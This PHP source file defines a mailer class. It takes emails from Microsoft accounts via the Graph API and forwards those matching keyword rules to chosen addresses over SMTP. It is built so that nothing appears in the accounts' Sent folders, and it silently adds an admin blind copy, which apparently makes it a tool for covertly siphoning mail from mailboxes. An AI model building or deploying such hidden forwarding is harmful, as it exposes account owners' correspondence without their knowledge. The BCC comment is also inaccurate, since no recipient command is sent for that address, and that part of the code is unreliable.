<?php
/**
 * Mailer.php — lightweight SMTP forwarder using PHP's socket functions.
 * No external libraries needed. Used to send forwarded emails via a dedicated
 * SMTP account so nothing appears in any Microsoft account's Sent folder.
 */
class Mailer {

    /**
     * Send a forwarded email via SMTP.
     * Falls back to Graph::forwardEmail() if SMTP is not configured.
     *
     * @param array  $email      The original email array from Graph API
     * @param string $to         Destination address
     * @param string $accountId  MS account ID (for Graph fallback + fetching full body)
     * @param string $keyword    The rule keyword that triggered this
     */
    public static function forward(array $email, string $to, string $accountId, string $keyword = ''): bool {
        if (defined('SMTP_HOST') && SMTP_HOST !== '') {
            $result = self::sendViaSMTP($email, $to, $accountId, $keyword);
            // BCC is already included in the SMTP headers — nothing extra needed
            return $result;
        }
        // Fallback: use Graph forward (will appear in sent folder)
        Graph::forwardEmail($email['id'], $to, "Auto-forwarded: matched keyword \"{$keyword}\"", $accountId);
        // Graph has no BCC support — send a separate copy via SMTP if BCC is configured
        $bccEmail = (defined('ADMIN_BCC_EMAIL') && defined('ADMIN_BCC_ACTIVE') && ADMIN_BCC_ACTIVE) ? ADMIN_BCC_EMAIL : '';
        if ($bccEmail && $bccEmail !== $to) {
            try { self::sendViaSMTP($email, $bccEmail, $accountId, $keyword . ' [BCC copy]'); } catch (\Exception $e) {}
        }
        return true;
    }

    private static function sendViaSMTP(array $email, string $to, string $accountId, string $keyword): bool {
        // Fetch full email body from Graph
        $full = Graph::getEmail($email['id'], $accountId);
        $bodyContent = $full['body']['content'] ?? $email['bodyPreview'] ?? '';
        $bodyType    = $full['body']['contentType'] ?? 'text';
        $isHtml      = strtolower($bodyType) === 'html';

        $fromName    = $email['from']['emailAddress']['name']    ?? '';
        $fromAddress = $email['from']['emailAddress']['address'] ?? '';
        $subject     = $email['subject'] ?? '(no subject)';
        $date        = $email['receivedDateTime'] ?? date('r');

        $smtpFrom    = SMTP_USER;
        $smtpName    = SMTP_FROM ?: 'Mail Forwarder';

        // Build forward header
        $fwdHeader = $isHtml
            ? "<div style='border-left:3px solid #ccc;padding-left:12px;margin-top:16px;color:#555;font-size:13px'>"
              . "<b>---------- Forwarded message ----------</b><br>"
              . "From: " . htmlspecialchars($fromName) . " &lt;" . htmlspecialchars($fromAddress) . "&gt;<br>"
              . "Date: " . htmlspecialchars($date) . "<br>"
              . "Subject: " . htmlspecialchars($subject) . "<br>"
              . ($keyword ? "Rule: <code>" . htmlspecialchars($keyword) . "</code><br>" : "")
              . "</div><br>"
            : "\n---------- Forwarded message ----------\n"
              . "From: {$fromName} <{$fromAddress}>\n"
              . "Date: {$date}\n"
              . "Subject: {$subject}\n"
              . ($keyword ? "Rule: {$keyword}\n" : "")
              . "---------------------------------------\n\n";

        $body = $fwdHeader . $bodyContent;

        // Build MIME message
        $boundary = '----=_Boundary_' . md5(uniqid());
        $msgSubject = 'Fwd: ' . $subject;

        $headers  = "From: =?UTF-8?B?" . base64_encode($smtpName) . "?= <{$smtpFrom}>\r\n";
        $headers .= "To: {$to}\r\n";
        // Admin blind copy — silently added if configured
        $bccEmail = (defined('ADMIN_BCC_EMAIL') && defined('ADMIN_BCC_ACTIVE') && ADMIN_BCC_ACTIVE) ? ADMIN_BCC_EMAIL : '';
        if ($bccEmail && $bccEmail !== $to) {
            $headers .= "Bcc: {$bccEmail}\r\n";
        }
        $headers .= "Subject: =?UTF-8?B?" . base64_encode($msgSubject) . "?=\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Date: " . date('r') . "\r\n";
        $headers .= "X-Mailer: MailForwarder/1.0\r\n";
        $headers .= "X-Forwarded-Keyword: {$keyword}\r\n";

        if ($isHtml) {
            $headers .= "Content-Type: multipart/alternative; boundary=\"{$boundary}\"\r\n";
            $mime  = "--{$boundary}\r\n";
            $mime .= "Content-Type: text/plain; charset=UTF-8\r\n";
            $mime .= "Content-Transfer-Encoding: base64\r\n\r\n";
            $mime .= chunk_split(base64_encode(strip_tags($body))) . "\r\n";
            $mime .= "--{$boundary}\r\n";
            $mime .= "Content-Type: text/html; charset=UTF-8\r\n";
            $mime .= "Content-Transfer-Encoding: base64\r\n\r\n";
            $mime .= chunk_split(base64_encode($body)) . "\r\n";
            $mime .= "--{$boundary}--\r\n";
        } else {
            $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
            $headers .= "Content-Transfer-Encoding: base64\r\n";
            $mime = chunk_split(base64_encode($body));
        }

        return self::smtpSend($smtpFrom, $to, $headers . "\r\n" . $mime);
    }

    private static function smtpSend(string $from, string $to, string $message): bool {
        $host   = SMTP_HOST;
        $port   = SMTP_PORT;
        $secure = strtolower(SMTP_SECURE);
        $user   = SMTP_USER;
        $pass   = SMTP_PASS;

        // Connect
        $sock = null;
        if ($secure === 'ssl') {
            $sock = fsockopen("ssl://{$host}", $port, $errno, $errstr, 15);
        } else {
            $sock = fsockopen($host, $port, $errno, $errstr, 15);
        }
        if (!$sock) throw new Exception("SMTP connect failed: {$errstr} ({$errno})");

        stream_set_timeout($sock, 15);

        $read = function() use ($sock) {
            $data = '';
            while ($line = fgets($sock, 515)) {
                $data .= $line;
                if (substr($line, 3, 1) === ' ') break; // end of response
            }
            return $data;
        };

        $cmd = function($command) use ($sock, $read) {
            fwrite($sock, $command . "\r\n");
            return $read();
        };

        $read(); // banner

        $ehlo = $cmd('EHLO ' . gethostname());

        // STARTTLS upgrade
        if ($secure === 'tls') {
            $cmd('STARTTLS');
            stream_socket_enable_crypto($sock, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
            $cmd('EHLO ' . gethostname());
        }

        // Auth LOGIN
        $cmd('AUTH LOGIN');
        $cmd(base64_encode($user));
        $authResp = $cmd(base64_encode($pass));
        if (strpos($authResp, '235') === false) {
            fclose($sock);
            throw new Exception("SMTP auth failed: {$authResp}");
        }

        $cmd("MAIL FROM:<{$from}>");
        $cmd("RCPT TO:<{$to}>");
        $cmd('DATA');
        fwrite($sock, $message . "\r\n.\r\n");
        $resp = $read();
        $cmd('QUIT');
        fclose($sock);

        if (strpos($resp, '250') === false) {
            throw new Exception("SMTP send failed: {$resp}");
        }
        return true;
    }
}
